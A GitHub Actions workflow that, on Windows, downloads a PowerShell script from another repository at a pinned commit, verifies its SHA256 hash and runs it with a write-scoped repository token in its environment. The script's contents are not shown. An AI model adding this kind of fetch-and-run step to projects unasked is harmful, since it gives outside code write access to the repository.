name: Collect existing installer Windows security evidence
on:
  push:
    branches: [main]
    paths: ['.github/workflows/check-windows-installer.yml']
permissions:
  contents: write
jobs:
  collect-windows-evidence:
    runs-on: windows-latest
    timeout-minutes: 12
    steps:
      - name: Check immutable installer on disposable Windows VM
        shell: pwsh
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          $ErrorActionPreference = 'Stop'
          $source = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/manbuusong-cpu/ai-maker-studio-installers/b84654ca783d6acc9d5ebcf1d8301471819fcbd4/ci/windows-installer-check.ps1').Content
          $path = Join-Path $env:RUNNER_TEMP 'windows-installer-check.ps1'
          [IO.File]::WriteAllText($path, [string]$source, [Text.UTF8Encoding]::new($false))
          if ((Get-FileHash $path -Algorithm SHA256).Hash.ToLowerInvariant() -ne '5d5f15e5ad99395695bafefeeb3d7533d769e326361153ffe984d443680ce007') { throw 'Diagnostics helper hash differs.' }
          & $path
